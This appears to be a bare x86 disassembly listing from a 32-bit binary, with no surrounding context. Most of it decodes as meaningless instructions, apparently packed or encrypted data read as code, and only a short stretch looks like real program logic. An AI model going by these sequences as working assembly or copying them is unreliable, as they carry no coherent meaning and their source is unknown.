  404241:	jp     0x404222
  404243:	adc    BYTE PTR [edi+esi*2-0x42],bh
  404247:	xor    DWORD PTR [edi-0x218008b0],ebp
  40424d:	mov    edi,0xc44baf72
  404252:	addr16 loope 0x404275
  404255:	mov    edx,0x520e066e
  40425a:	mov    al,0xc
  40425c:	xchg   ebx,eax
  40425d:	push   ecx
  40425e:	xchg   esp,eax
  40425f:	int    0x46
  404261:	sbb    dl,BYTE PTR [ebx-0x4b]
  404264:	jmp    0xb2ed3300
  404269:	mov    al,ds:0x49bc0010
  40426e:	les    esi,FWORD PTR [edx-0x3b0ef290]
  404274:	xchg   esi,eax
  404275:	mov    esi,0x39e25435
  40427a:	loope  0x4042d4
  40427c:	xchg   esp,eax
  40427d:	outs   dx,DWORD PTR ds:[esi]
  40427e:	imul   BYTE PTR es:[ebx]
  404281:	leave  
  404282:	sar    ebp,1
  404284:	xor    al,0x1e
  404286:	inc    esp
  404287:	mov    al,0x91
  404289:	cwde   
  40428a:	jle    0x404272
  40428c:	add    cl,BYTE PTR [edx+ecx*8-0x5e]
  404290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404291:	push   ds
  404292:	push   edi
  404293:	jns    0x40429b
  404295:	pop    ebx
  404296:	jmp    0x6936fe25
  40429b:	and    ebp,esi
  40429d:	ins    DWORD PTR es:[edi],dx
  40429e:	xchg   bl,al
  4042a0:	mov    ?,WORD PTR [ecx]
  4042a2:	(bad)  
  4042a3:	icebp  
  4042a4:	dec    esi
  4042a5:	data16 fild DWORD PTR [ebp+0x1ccc00db]
  4042ac:	jmp    0xef6a:0x57dca9ae
  4042b3:	push   cs
  4042b4:	cdq    
  4042b5:	mov    dh,0xf4
  4042b7:	arpl   WORD PTR [edi],si
  4042b9:	out    dx,eax
  4042ba:	add    eax,0x5fe685f0
  4042bf:	cdq    
  4042c0:	in     al,dx
  4042c1:	inc    ebp
  4042c2:	push   ecx
  4042c3:	and    esi,DWORD PTR [edi+0x1cb6aa3b]
  4042c9:	push   ds
  4042ca:	fs int3 
  4042cc:	repz dec eax
  4042ce:	jecxz  0x404322
  4042d0:	push   0x266712e7
  4042d5:	pop    edx
  4042d6:	ss je  0x404259
  4042d9:	outs   dx,BYTE PTR ds:[esi]
  4042da:	inc    edx
  4042db:	popf   
  4042dc:	push   esi
  4042dd:	xlat   BYTE PTR ds:[ebx]
  4042de:	xchg   ebx,eax
  4042df:	pop    edx
  4042e0:	inc    esp
  4042e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4042e2:	call   0x11c1c4
  4042e7:	rcr    BYTE PTR [esi+edi*8-0x36afda00],cl
  4042ee:	scas   eax,DWORD PTR es:[edi]
  4042ef:	rcl    BYTE PTR [eax],cl
  4042f1:	pop    ss
  4042f2:	fiadd  DWORD PTR [eax-0x7970ce03]
  4042f8:	ret    
  4042f9:	pop    edx
  4042fa:	leave  
  4042fb:	and    dh,dl
  4042fd:	pop    ebp
  4042fe:	(bad)  
  4042ff:	(bad)  
  404301:	add    ebp,edx
  404303:	daa    
  404304:	cmp    DWORD PTR [eax-0x6a],edi
  404307:	jo     0x40431b
  404309:	pop    esp
  40430a:	cdq    
  40430b:	pop    ss
  40430c:	mov    ebx,0x6408f35c
  404311:	addr16 adc bh,0x9d
  404315:	jecxz  0x404390
  404317:	stc    
  404318:	jno    0x4042c1
  40431a:	xor    BYTE PTR [edx+0xce4a760],ah
  404320:	sub    al,0x95
  404322:	sub    al,0x44
  404324:	jecxz  0x404379
  404326:	popa   
  404327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404328:	adc    BYTE PTR [esi],dh
  40432a:	pop    ss
  40432b:	call   0xe6cb659a
  404330:	mov    dh,0x1d
  404332:	mov    BYTE PTR [ebx-0x35ff724],ch
  404338:	nop
  404339:	(bad)  
  40433a:	std    
  40433b:	fisttp DWORD PTR [ebx]
  40433d:	(bad)  
  40433e:	sar    BYTE PTR [ebx+0x46],cl
  404341:	or     BYTE PTR [ecx],bh
  404343:	dec    esi
  404344:	push   esi
  404345:	cmp    eax,0x6772805b
  40434a:	aas    
  40434b:	jbe    0x404308
  40434d:	and    cl,BYTE PTR [esi]
  40434f:	push   edx
  404350:	ror    edx,cl
  404352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404353:	xchg   DWORD PTR [edx-0x70576059],ebp
  404359:	or     eax,0xd5f99765
  40435e:	mov    esp,0xccc1793a
  404363:	xchg   BYTE PTR [ebx+ecx*8+0x7f20b6cc],ch
  40436a:	jbe    0x40431b
  40436c:	adc    BYTE PTR [ecx+0x2],cl
  40436f:	and    DWORD PTR [edx+0xa],ecx
  404372:	inc    edi
  404373:	(bad)  
  404374:	cwde   
  404375:	xchg   ebp,eax
  404376:	hlt    
  404377:	pop    esi
  404378:	in     al,0xbe
  40437a:	pop    ebx
  40437b:	aad    0x25
  40437d:	cwde   
  40437e:	cmc    
  40437f:	idiv   ah
  404381:	into   
  404382:	sbb    DWORD PTR [ebp+0x3c],0x2a
  404386:	les    esi,FWORD PTR [eax+0x45]
  404389:	in     al,0xf4
  40438b:	sbb    edx,DWORD PTR [eax]
  40438d:	add    edx,DWORD PTR [eax+0x35267ca5]
  404393:	dec    ebx
  404394:	paddusb mm5,mm7
  404397:	mov    edx,0x3572cbd9
  40439c:	ss (bad) 
  40439e:	call   0xb935d3dc
  4043a3:	ret    0x96c0
  4043a6:	mov    edx,esp
  4043a8:	sti    
  4043a9:	mov    edi,0xea43d00
  4043ae:	cli    
  4043af:	cld    
  4043b0:	ins    BYTE PTR es:[edi],dx
  4043b1:	div    BYTE PTR [esp+edx*4+0xb]
  4043b5:	adc    al,ah
  4043b7:	xor    al,0xc9
  4043b9:	sub    cl,BYTE PTR [ecx-0x1ef0e039]
  4043bf:	push   sp
  4043c1:	adc    BYTE PTR [eax],dl
  4043c3:	adc    edi,edi
  4043c5:	mov    bh,0xad
  4043c7:	test   edx,ebx
  4043c9:	xor    ecx,ebp
  4043cb:	inc    ebp
  4043cc:	and    ah,dl
  4043ce:	div    DWORD PTR [esi+0x32e36958]
  4043d4:	jo     0x404356
  4043d6:	shr    BYTE PTR [ebp+0xa],0x17
  4043da:	sbb    al,0x6b
  4043dc:	or     al,0xff
  4043de:	jmp    0x8bb:0x52aa3b7c
  4043e5:	pop    ss
  4043e6:	dec    ecx
  4043e7:	lea    ecx,[esi-0x6b]
  4043ea:	ins    BYTE PTR es:[edi],dx
  4043eb:	stos   BYTE PTR es:[edi],al
  4043ec:	mov    ah,0x7a
  4043ee:	mov    ch,0x46
  4043f0:	dec    esi
  4043f1:	js     0x404432
  4043f3:	xchg   ebp,eax
  4043f4:	jg     0x404393
  4043f6:	scas   eax,DWORD PTR es:[edi]
  4043f7:	jp     0x404400
  4043f9:	pop    edi
  4043fa:	and    DWORD PTR [ecx+0x71171946],ebx
  404400:	jb     0x404432
  404402:	adc    bh,0x8f
  404405:	shl    DWORD PTR [eax],1
  404407:	into   
  404408:	mov    ecx,0x1973d7aa
  40440d:	sub    DWORD PTR [eax],eax
  40440f:	(bad)  
  404410:	ins    BYTE PTR es:[edi],dx
  404411:	addr16 pop ecx
  404413:	jae    0x40446c
  404415:	sub    DWORD PTR [ebp+0x23],ebp
  404418:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404419:	(bad)  
  40441a:	lock lods al,BYTE PTR ds:[esi]
  40441c:	mov    ebx,0x31a9e920
  404421:	push   cs
  404422:	jne    0x404479
  404424:	das    
  404425:	ja     0x4043e0
  404427:	nop
  404428:	push   esp
  404429:	mov    dl,0xf9
  40442b:	in     al,dx
  40442c:	imul   eax,DWORD PTR [ebp-0x7e],0xc4d2a3a
  404433:	jns    0x404461
  404435:	in     eax,0x4b
  404437:	aad    0x3e
  404439:	adc    ecx,edi
  40443b:	mov    esi,DWORD PTR [eax-0x4a]
  40443e:	icebp  
  40443f:	mov    dl,0x97
  404441:	jae    0x404413
  404443:	mov    esp,0x1a865d15
  404448:	cld    
  404449:	cmp    al,0xea
  40444b:	cld    
  40444c:	iret   
  40444d:	scas   eax,DWORD PTR es:[edi]
  40444e:	jmp    DWORD PTR [edi+edx*2+0x39]
  404452:	xor    bl,bh
  404454:	push   0xffffffdd
  404456:	into   
  404457:	adc    esi,DWORD PTR [ebx+eax*8]
  40445a:	jbe    0x40446d
  40445c:	in     al,0x29
  40445e:	arpl   bx,di
  404460:	out    dx,eax
  404461:	sar    BYTE PTR [ebx],cl
  404463:	data16 std 
  404465:	stc    
  404466:	jne    0x4043fb
  404468:	daa    
  404469:	pop    ss
  40446a:	add    DWORD PTR [ebx-0x470c8c2f],edx
  404470:	jbe    0x4044bc
  404472:	push   0xffffff8d
  404474:	mov    esi,0x2b5bed88
  404479:	xor    al,0x1e
  40447b:	cli    
  40447c:	xor    edi,eax
  40447e:	jmp    0x404781
  404483:	add    bl,BYTE PTR [ebp+0x44]
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x40450c
  404490:	aaa    
  404491:	mov    esp,0x7e185e2b
  404496:	jle    0x4044f0
  404498:	jl     0x404518
  40449a:	jle    0x4044e8
  40449c:	inc    esp
  40449d:	xchg   DWORD PTR [ebx],ebx
  40449f:	int3   
  4044a0:	jmp    0x404469
  4044a2:	or     eax,0xce586541
  4044a7:	push   0xfffffffe
  4044a9:	nop
  4044aa:	scas   al,BYTE PTR es:[edi]
  4044ab:	dec    ecx
  4044ac:	sub    DWORD PTR [eax],ebx
  4044ae:	inc    ebx
  4044af:	push   cs
  4044b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044b1:	inc    ebx
  4044b2:	sbb    DWORD PTR [edi],edi
  4044b4:	push   ebp
  4044b5:	retf   
  4044b6:	dec    esi
  4044b7:	push   DWORD PTR [esi+0x615976b3]
  4044bd:	adc    BYTE PTR [ecx],0x36
  4044c0:	inc    ecx
  4044c1:	push   ebp
  4044c2:	aam    0xcb
  4044c4:	dec    edx
  4044c5:	and    BYTE PTR [edx],dh
  4044c7:	(bad)  
  4044c8:	out    dx,al
  4044c9:	loopne 0x404457
  4044cb:	popf   
  4044cc:	loopne 0x40452d
  4044ce:	dec    ebx
  4044cf:	xchg   ebx,eax
  4044d0:	xor    DWORD PTR [edx-0x38],edi
  4044d3:	pop    esp
  4044d4:	rol    DWORD PTR [ebp-0x4e],1
  4044d7:	repz and BYTE PTR [edi-0x3],ah
  4044db:	(bad)  
  4044dc:	fs aas 
  4044de:	xchg   edx,eax
  4044df:	sub    ebp,edx
  4044e1:	cdq    
  4044e2:	mov    dh,0x1b
  4044e4:	sti    
  4044e5:	jp     0x404521
  4044e7:	add    ah,BYTE PTR [eax]
  4044e9:	and    BYTE PTR [ebx],cl
  4044eb:	ret    
  4044ec:	in     al,dx
  4044ed:	mov    eax,0x20d3acf2
  4044f2:	jno    0x4044bc
  4044f4:	das    
  4044f5:	pop    esi
  4044f6:	hlt    
  4044f7:	mov    cl,0x72
  4044f9:	mov    dh,0xb1
  4044fb:	stos   BYTE PTR es:[edi],al
  4044fc:	and    BYTE PTR [eax*8+0xdede7c7],bh
  404503:	scas   al,BYTE PTR es:[edi]
  404504:	arpl   WORD PTR [ebx+0x63],bx
  404507:	stos   BYTE PTR es:[edi],al
  404508:	sub    esp,DWORD PTR ds:0x1dd6d1f1
  40450e:	cmp    eax,0xbb97f736
  404513:	and    al,0x73
  404515:	popf   
  404516:	mov    al,0xc5
  404518:	mov    eax,ds:0xfef13e11
  40451d:	inc    dh
  40451f:	mov    esp,0xc0b42e7f
  404524:	adc    al,ah
  404526:	lods   eax,DWORD PTR ds:[esi]
  404527:	xchg   esp,eax
  404528:	mov    edx,esp
  40452a:	imul   edx,DWORD PTR [ebx+0x46],0x2ee2dc33
  404531:	add    ah,BYTE PTR [ebx-0x51]
  404534:	adc    DWORD PTR [ebx+0x3f2870aa],ebp
  40453a:	mov    dl,0x99
  40453c:	ss ret 
  40453e:	or     DWORD PTR [ebx],0x189b2d4d
  404544:	pop    edx
  404545:	xor    esp,ebp
  404547:	inc    esp
  404548:	in     eax,0x65
  40454a:	adc    al,0xc3
  40454c:	sbb    edx,0x5475188e
  404552:	adc    al,0x4f
  404554:	les    ebp,FWORD PTR [ebp-0x1c]
  404557:	es out 0x8b,eax
  40455a:	jg     0x4045a2
  40455c:	sbb    al,0x62
  40455e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40455f:	clc    
  404560:	cli    
  404561:	pop    edx
  404562:	(bad)  
  404563:	mov    esi,cs
  404565:	dec    edi
  404566:	iret   
  404567:	dec    ebx
  404568:	call   0xacc5da3d
  40456d:	enter  0x8252,0xf7
  404571:	(bad)  
  404573:	and    edi,esi
  404575:	sub    DWORD PTR [eax-0x24],ebx
  404578:	shl    DWORD PTR [ebx+0x62d65b1f],1
  40457e:	cmc    
  40457f:	loopne 0x40451e
  404581:	cmp    BYTE PTR [ecx+edx*8],ah
  404584:	adc    DWORD PTR [ebp-0x72de8064],ebp
  40458a:	cmp    eax,0x829ca9ba
  40458f:	(bad)  
  404590:	repz (bad)
  404593:	push   ss
  404594:	arpl   WORD PTR [eax+0x52],bx
  404597:	push   es
  404598:	cmp    eax,0xb4dcf8db
  40459d:	jmp    0xd5af9f9c
  4045a2:	sbb    ebp,ebx
  4045a4:	jnp    0x4045e2
  4045a6:	test   edx,ecx
  4045a8:	cmp    DWORD PTR [esi-0x4b],ebx
  4045ab:	cmp    bh,BYTE PTR [esi-0x23]
  4045ae:	cmp    eax,0x5238f53b
  4045b3:	sub    dh,BYTE PTR [edi+0x4a9fdd72]
  4045b9:	std    
  4045ba:	xchg   ecx,eax
  4045bb:	jmp    DWORD PTR [edx-0x1b7dce6f]
  4045c1:	cwde   
  4045c2:	mov    bl,0x4f
  4045c4:	sub    DWORD PTR es:[edx+ebp*4],ecx
  4045c8:	or     al,0x14
  4045ca:	sbb    ecx,DWORD PTR [ebx-0x9]
  4045cd:	mov    ebx,0x53f23f71
  4045d2:	xchg   DWORD PTR [ebx+0x47],esi
  4045d5:	sbb    DWORD PTR [ebx+edi*8+0x2e5f8722],ebp
  4045dc:	ss loopne 0x4045f6
  4045df:	in     eax,dx
  4045e0:	scas   al,BYTE PTR es:[edi]
  4045e1:	pop    eax
  4045e2:	adc    cl,cl
  4045e4:	fst    QWORD PTR [edx+ecx*2]
  4045e7:	cs push eax
  4045e9:	fist   DWORD PTR ds:0x5842e1ad
  4045ef:	in     eax,0x9
  4045f1:	ror    DWORD PTR [ecx+ecx*2],1
  4045f4:	jns    0x404580
  4045f6:	into   
  4045f7:	cmp    dh,BYTE PTR [edx-0x67e38a3e]
  4045fd:	and    BYTE PTR [edi-0x655b6359],dh
  404603:	sar    BYTE PTR [ecx-0x2a13e576],cl
  404609:	shl    DWORD PTR [edi],cl
  40460b:	test   al,0x2b
  40460d:	or     esi,edx
  40460f:	jno    0x404648
  404611:	jne    0x4045f8
  404613:	(bad)  [ebx+0x42be12f3]
  404619:	mov    al,ds:0x4d153ea4
  40461e:	arpl   WORD PTR [esi],cx
  404620:	pop    ebx
  404621:	imul   edx,DWORD PTR [edi],0x5dad7144
  404627:	test   bh,dl
  404629:	lods   al,BYTE PTR ds:[esi]
  40462a:	in     al,0x73
  40462c:	(bad)  
  40462d:	rol    BYTE PTR [ecx],1
  40462f:	lahf   
  404630:	xchg   esi,eax
  404631:	dec    eax
  404632:	(bad)  [ebx+0x4f]
  404635:	fsubr  DWORD PTR [edi]
  404637:	outs   dx,BYTE PTR ds:[esi]
  404638:	xchg   eax,esp
  40463a:	inc    DWORD PTR [eax-0x57]
  40463d:	inc    esp
  40463e:	aad    0xeb
  404640:	sbb    eax,0x56c6a365
  404645:	imul   esp,DWORD PTR [ebx-0x1e],0x2455aa4a
  40464c:	ins    DWORD PTR es:[edi],dx
  40464d:	pop    gs
  40464f:	mov    cl,0xe5
  404651:	cli    
  404652:	inc    ebp
  404653:	in     al,0xb
  404655:	mov    bl,0x4a
  404657:	mov    edx,0x540ce127
  40465c:	div    BYTE PTR [ecx]
  40465e:	push   ds
  40465f:	mov    al,0xc4
  404661:	mov    bh,0x26
  404663:	shl    DWORD PTR [ecx-0x44938789],1
  404669:	mov    bl,0xef
  40466b:	push   ebp
  40466c:	or     al,dh
  40466e:	cmp    DWORD PTR [edx+0x207aa3c7],ebx
  404674:	inc    esi
  404675:	sbb    DWORD PTR [edx+0x31],esp
  404678:	xchg   edi,eax
  404679:	adc    eax,0x5f00e7e
  40467e:	aad    0xea
  404680:	mov    eax,0xc0db8d31
  404685:	jmp    0xb62d5155
  40468a:	lea    esi,[ebx+0x18]
  40468d:	add    BYTE PTR [eax],dh
  40468f:	mov    eax,0x55e7e6cf
  404694:	or     BYTE PTR [ebx],dh
  404696:	std    
  404697:	icebp  
  404698:	pop    es
  404699:	nop
  40469a:	inc    eax
  40469b:	jecxz  0x404708
  40469d:	das    
  40469e:	dec    esp
  40469f:	gs aam 0x3d
  4046a2:	sub    eax,0x7f97cd5
  4046a7:	jl     0x40469e
  4046a9:	cli    
  4046aa:	mov    esi,edi
  4046ac:	jg     0x40465b
  4046ae:	xor    BYTE PTR [ecx-0x581922d1],al
  4046b4:	into   
  4046b5:	xor    BYTE PTR [ebx-0x2bf5059c],0x1
  4046bc:	shr    BYTE PTR [edi],0xa1
  4046bf:	sub    cl,BYTE PTR [edx+0x36]
  4046c2:	mov    eax,0x717d8d23
  4046c7:	enter  0xeb7d,0x1c
  4046cb:	add    cl,BYTE PTR [esi-0x43d4a8b3]
  4046d1:	aas    
  4046d2:	sbb    DWORD PTR [edx-0x33],0x2e
  4046d6:	rol    DWORD PTR [ecx+ebx*2+0x30],cl
  4046da:	dec    ecx
  4046dc:	inc    ebp
  4046dd:	lock fidivr WORD PTR [ecx-0x23]
  4046e1:	add    al,0x4d
  4046e3:	jl     0x404750
  4046e5:	mov    dh,0x54
  4046e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046e8:	cmp    DWORD PTR [esp+edi*8+0x4d9e9396],0xa64155e7
  4046f3:	loop   0x404685
  4046f5:	xor    eax,0xcd8f21ad
  4046fa:	dec    BYTE PTR gs:[edi]
  4046fd:	int    0x7c
  4046ff:	shl    BYTE PTR [edx-0x59c8c412],1
  404705:	mov    ah,0x49
  404707:	das    
  404708:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404709:	push   ebx
  40470a:	sbb    ch,BYTE PTR [ecx]
  40470c:	mov    al,ds:0x3f3694fc
  404711:	popa   
  404712:	daa    
  404713:	aam    0x7b
  404715:	add    DWORD PTR [esi-0x8],0xec46a53e
  40471c:	and    eax,0x751f8c0e
  404721:	mov    ds:0x78ebe9af,eax
  404726:	mov    esi,0x87314617
  40472b:	(bad)  
  40472c:	into   
  40472d:	jg     0x4047ac
  40472f:	(bad)  
  404730:	jge    0x40479b
  404732:	pop    ds
  404733:	pop    ebp
  404734:	mov    eax,ds:0x81089f5b
  404739:	mov    al,ds:0xaa219a69
  40473e:	adc    eax,0xf453f6d5
  404743:	call   0xaa55c093
  404748:	ins    BYTE PTR es:[edi],dx
  404749:	and    eax,0x408eef42
  40474e:	js     0x404754
  404750:	add    al,al
  404752:	pop    esp
  404753:	loope  0x4047a1
  404755:	xor    BYTE PTR [edi+0x19a0b010],bl
  40475b:	cwde   
  40475c:	sub    eax,DWORD PTR [edi+0x5ff2c868]
  404762:	inc    edx
  404763:	and    eax,0xa574797b
  404768:	pop    esi
  404769:	fsub   st(6),st
  40476b:	mov    cl,0xf
  40476d:	sbb    DWORD PTR [edi+edx*4+0x55adcaa3],ecx
  404774:	int    0x71
  404776:	and    DWORD PTR [esi+0x477f5909],0xffffffce
  40477d:	xlat   BYTE PTR ds:[ebx]
  40477e:	add    BYTE PTR [ecx],bh
  404780:	sbb    dh,BYTE PTR [ebx]
  404782:	rol    BYTE PTR [ebx],1
  404784:	stc    
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	ficomp DWORD PTR [edx]
  4047b6:	cmp    dl,BYTE PTR [ecx+0x7e7e27b8]
  4047bc:	pop    eax
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404831
  4047c1:	inc    esp
  4047c2:	arpl   WORD PTR [edi+0x2e],dx
  4047c5:	sub    DWORD PTR [ebp-0x6c885d84],esi
  4047cb:	push   ebx
  4047cc:	lock std 
  4047ce:	mov    ch,0x10
  4047d0:	jle    0x404811
  4047d2:	aas    
  4047d3:	adc    eax,0x536db214
  4047d8:	jb     0x404838
  4047da:	sti    
  4047db:	inc    edi
  4047dc:	ret    0x36ad
  4047df:	in     eax,dx
  4047e0:	dec    ebx
  4047e1:	clc    
  4047e2:	addr16 xchg esi,eax
  4047e4:	data16 daa 
  4047e6:	push   esp
  4047e7:	mov    al,BYTE PTR [ecx-0x1022d47f]
  4047ed:	mov    bh,0xa9
  4047ef:	mov    BYTE PTR [esi+edx*4],ch
  4047f2:	dec    edi
  4047f3:	jmp    0xef65:0x2f10d543
  4047fa:	inc    ebp
  4047fb:	mov    al,bl
  4047fd:	jmp    0x404874
  4047ff:	ja     0x4047d5
  404801:	add    eax,0x1e1d67f
  404806:	clc    
  404807:	repnz pop ds
  404809:	daa    
  40480a:	fcom   st(6)
  40480c:	fnstenv [ebx-0x5b]
  40480f:	push   esi
  404810:	loopne 0x404862
  404812:	push   ebp
  404813:	daa    
  404814:	(bad)  [esi+0x31]
  404817:	les    eax,FWORD PTR [ebp+esi*2-0x10e3707b]
  40481e:	xchg   BYTE PTR [edx-0x340657ca],bh
  404824:	enter  0x871f,0x96
  404828:	xchg   BYTE PTR [edx],bh
  40482a:	jnp    0x4047b4
  40482c:	repnz shr edi,1
  40482f:	push   esi
  404830:	pusha  
  404831:	lea    ebx,[esi]
  404833:	rcl    BYTE PTR ds:0xd04352fb,cl
  404839:	inc    edi
  40483a:	push   edx
  40483b:	bnd call 0x1b7afccb
  404841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404842:	jb     0x4047f2
  404844:	in     al,dx
  404845:	add    al,ch
  404847:	out    dx,al
  404848:	cld    
  404849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40484a:	js     0x404869
  40484c:	jge    0x4048ba
  40484e:	and    eax,0x9a5d4bc4
  404853:	popf   
  404854:	dec    edx
  404855:	mov    edi,0x6518d759
  40485a:	sbb    bl,BYTE PTR [esi-0x3f]
  40485d:	rol    BYTE PTR [ebx-0x6ff0410],cl
  404863:	clc    
  404864:	xlat   BYTE PTR ds:[ebx]
  404865:	call   edi
  404867:	add    al,BYTE PTR [edx]
  404869:	jnp    0x40486c
  40486b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40486c:	ja     0x4047f6
  40486e:	aad    0xc7
  404870:	fimul  WORD PTR [edi+0x238548dc]
  404876:	pop    eax
  404877:	pusha  
  404878:	xor    BYTE PTR [esi],ch
  40487a:	ja     0x4048da
  40487c:	fisub  DWORD PTR [ecx-0x3ecf891d]
  404882:	leave  
  404883:	mov    edx,0x8e9e87a9
  404888:	jno    0x40489c
  40488a:	fimul  WORD PTR [ebp-0x391f0c1d]
  404890:	outs   dx,DWORD PTR ds:[esi]
  404891:	test   BYTE PTR cs:[edi],ah
  404894:	repnz push ss
  404896:	jmp    0x212f:0x2ccd771f
  40489d:	ins    BYTE PTR es:[edi],dx
  40489e:	test   ecx,esp
  4048a0:	sbb    esp,edx
  4048a2:	fwait
  4048a3:	outs   dx,DWORD PTR ds:[esi]
  4048a4:	xor    al,0xd8
  4048a6:	cmp    ebp,DWORD PTR [ecx-0x91afc1d]
  4048ac:	dec    ebp
  4048ad:	push   0x1
  4048af:	mov    ch,BYTE PTR [ebp-0x2c]
  4048b2:	std    
  4048b3:	iret   
  4048b4:	js     0x404839
  4048b6:	pusha  
  4048b7:	retf   0xe657
  4048ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048bb:	sti    
  4048bc:	ret    0xfb1
  4048bf:	(bad)  [ebp+eiz*8-0x512502d4]
  4048c6:	nop
  4048c7:	nop
  4048c8:	ret    
  4048c9:	cs or  al,0xd
  4048cc:	aam    0x3e
  4048ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048cf:	xchg   ebx,eax
  4048d0:	push   0x2dc1fc7f
  4048d5:	test   ah,bl
  4048d7:	xor    esi,esi
  4048d9:	and    DWORD PTR [ebx+0x19bebab2],ebx
  4048df:	test   BYTE PTR [esi],0xd8
  4048e2:	arpl   WORD PTR [edx-0x59cafb53],bx
  4048e8:	cwde   
  4048e9:	push   cs
  4048ea:	lods   eax,DWORD PTR ds:[esi]
  4048eb:	es rcl esi,1
  4048ee:	mov    bl,0x87
  4048f0:	fdivr  st,st(1)
  4048f2:	dec    ebx
  4048f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048f4:	addr16 mov bl,0x55
  4048f7:	or     ch,BYTE PTR cs:[esp+esi*4]
  4048fb:	cmp    edi,DWORD PTR [ebp+0x408efcf3]
  404901:	sti    
  404902:	cmp    DWORD PTR [eax-0x54],ecx
  404905:	adc    dl,cl
  404907:	mov    bh,0x8e
  404909:	mov    bl,0xbe
  40490b:	lahf   
  40490c:	inc    ecx
  40490d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40490e:	sub    BYTE PTR [ebx],0xa3
  404911:	lds    eax,FWORD PTR ds:0xa6e130d1
  404917:	mov    ebp,0xc721fdaf
  40491c:	bound  eax,QWORD PTR ds:0xe14591b6
  404922:	ins    DWORD PTR es:[edi],dx
  404923:	jb     0x4048c9
  404925:	pop    ebp
  404926:	mov    eax,0x9c02884
  40492b:	daa    
  40492c:	add    DWORD PTR [esi-0x2b],0xffffffff
  404930:	sub    cl,bl
  404932:	pop    es
  404933:	loope  0x404906
  404935:	mov    eax,ds:0xa40fd52d
  40493a:	mov    BYTE PTR [ebx],cl
  40493c:	mov    al,ds:0x2678763a
  404941:	mov    BYTE PTR [ebp+0x558a3ac7],ch
  404947:	call   0x5781:0x67ef839c
  40494e:	cli    
  40494f:	dec    ebx
  404950:	ffree  st(7)
  404952:	dec    eax
  404953:	xchg   esp,eax
  404954:	popa   
  404955:	arpl   WORD PTR [ebp+edx*2-0x536d771],ax
  40495c:	xchg   esi,eax
  40495d:	(bad)  
  40495e:	dec    eax
  40495f:	fidiv  WORD PTR [edi+0x26]
  404962:	int3   
  404963:	ficomp WORD PTR [edi+0x33]
  404966:	scas   eax,DWORD PTR es:[edi]
  404967:	cdq    
  404968:	push   ss
  404969:	or     BYTE PTR [edi-0x48],0x93
  40496d:	pop    esp
  40496e:	mov    ds,edi
  404970:	push   esi
  404971:	jbe    0x404901
  404973:	cmc    
  404974:	xchg   edi,eax
  404975:	int    0x60
  404977:	cld    
  404978:	(bad)  
  404979:	int    0xd3
  40497b:	mov    eax,0x48fde4e3
  404980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404981:	nop
  404982:	cmc    
  404983:	adc    ecx,DWORD PTR [edi-0x644f47d6]
  404989:	inc    eax
  40498a:	pop    edx
  40498b:	dec    edi
  40498c:	xor    ebx,0x6
  40498f:	jg     0x40491a
  404991:	retf   0x7de3
  404994:	cdq    
  404995:	shl    DWORD PTR [esi+0x2c],0x3c
  404999:	inc    edi
  40499a:	push   0x191282d9
  40499f:	sub    eax,0x4eb69b2f
  4049a4:	mov    eax,ds:0x48f6d1e2
  4049a9:	data16 cmc 
  4049ab:	repnz sub al,BYTE PTR [edx]
  4049ae:	sti    
  4049af:	lahf   
  4049b0:	bound  ebp,QWORD PTR [edx-0xba3ec3f]
  4049b6:	mov    cl,0xad
  4049b8:	add    ebx,DWORD PTR [eax-0x70]
  4049bb:	push   ebp
  4049bc:	fcomip st,st(2)
  4049be:	mov    WORD PTR [edi+0x6d],ds
  4049c1:	mov    esi,ebx
  4049c3:	in     al,0x85
  4049c5:	ja     0x404a3c
  4049c7:	add    DWORD PTR [edx-0x62],esp
  4049ca:	mov    BYTE PTR [eax+0x4c],0xe0
  4049ce:	div    dl
  4049d0:	(bad)  
  4049d1:	push   ds
  4049d2:	jmp    0x4bfd:0xf594c28b
  4049d9:	sar    al,1
  4049db:	lahf   
  4049dc:	cs inc eax
  4049de:	imul   eax,DWORD PTR [edx+eax*2+0x4e],0xefcf5439
  4049e6:	stc    
  4049e7:	pop    edx
  4049e8:	ficomp WORD PTR ds:0xf245e285
  4049ee:	inc    ebp
  4049ef:	outs   dx,BYTE PTR ds:[esi]
  4049f0:	pop    esi
  4049f1:	and    bh,BYTE PTR [edx]
  4049f3:	jb     0x40499d
  4049f5:	mov    ch,0xf9
  4049f7:	outs   dx,DWORD PTR ds:[esi]
  4049f8:	test   eax,0x84e30e59
  4049fd:	push   edx
  4049fe:	sbb    dh,BYTE PTR [eax-0x6a]
  404a01:	jo     0x404a35
  404a03:	xor    bl,bh
  404a05:	pop    ecx
  404a06:	mov    edi,0x69a5247d
  404a0b:	xchg   esp,eax
  404a0c:	jb     0x4049e0
  404a0e:	push   cs
